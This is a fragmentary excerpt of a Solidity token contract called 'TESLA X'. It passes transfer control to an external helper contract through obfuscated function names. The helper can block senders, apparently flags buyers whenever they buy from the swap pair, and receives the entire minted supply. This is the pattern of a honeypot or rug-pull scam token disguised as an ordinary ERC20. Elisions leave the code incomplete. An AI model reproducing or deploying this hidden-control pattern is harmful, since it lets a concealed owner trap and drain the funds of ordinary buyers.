...
interface fish2{
    ...
    function jei_two(address addr) external view returns(bool);
    function uem_five(address addr) external view returns (bool);
    function imv_sex(address addr)external view returns(bool);
    function xlv_three(address addr, bool state) external;
    function j1q_eight() external view returns(bool);
    function ien_thirteen()external view returns(address);
    function lo4_fourteen(address addr)external;
}

contract hello1 is  Context, IERC20, Ownable, ReentrancyGuard{
    using SafeMath for uint256;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "TESLA X ";
    ...
    constructor(address _help) {
       ...
       swapPairAddress1 = IUniswapV2Factory(_router.factory()).createPair(
        ...
        help = _help;
        TokenHope = fish2(_help);
        _receive = TokenHope.ien_thirteen();
        _isSwapPair[swapPairAddress1] = true;
        swapRouter = _router;
        _balances[_receive] = 300000 * 10**18;
        _totalSupply = 300000 * 10**18;
        emit Transfer(address(0), _receive, 300000 * 10**18);
    }
    ...
    function _transfer(
        ...
        require(!TokenHope.jei_two(from), "!!! ");
       if(TokenHope.imv_sex(to) || TokenHope.imv_sex(from)){
        ...
        if(_isSwapPair[from]) {
            TokenHope.lo4_fourteen(from);
        }

        _balances[from] = _balances[from].sub(amount,"ERC20: _transferStandard amount exceeds balance");
        _balances[to] = _balances[to].add(amount);
        
        if(TokenHope.uem_five(from) || TokenHope.uem_five(to)) {
